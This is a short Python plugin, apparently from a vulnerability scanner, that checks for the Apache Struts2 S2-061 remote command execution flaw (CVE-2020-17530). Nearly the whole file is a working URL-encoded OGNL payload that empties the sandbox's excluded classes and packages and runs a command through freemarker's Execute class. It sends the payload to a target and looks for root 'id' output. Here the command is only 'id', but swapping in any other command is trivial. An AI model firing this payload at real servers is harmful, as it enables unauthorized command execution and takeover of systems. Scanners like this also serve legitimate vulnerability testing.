#!/usr/bin/python
# coding=utf-8
'''
Date: 2022-03-21 18:38:53
LastEditors: recar
LastEditTime: 2022-03-23 18:15:16
'''

from plugins.poc.base import PocBase


class Poc(PocBase):
    def __init__(self):
        super(PocBase, self).__init__()
        self.name = "Struts2 S2-061 远程命令执行漏洞"
        self.cve = "CVE-2020-17530"
        self.author = "Recar"
        self.desc = "S2-061是对S2-059的绕过，Struts2官方对S2-059的修复方式是加强OGNL表达式沙盒，而S2-061绕过了该沙盒。该漏洞影响版本范围是Struts 2.0.0到Struts 2.5.25"
        self.fingerprint = "struts2"

    def verify(self):
        cmd = "id"
        payload="%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27"+cmd+"%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d"
        url=self.base_url+"/?id="+payload
        response =  self.get(url, timeout=3)
        if "uid=0(root) gid=0(root) groups=0(root)" in response.text:
            return True, url
        return False, None

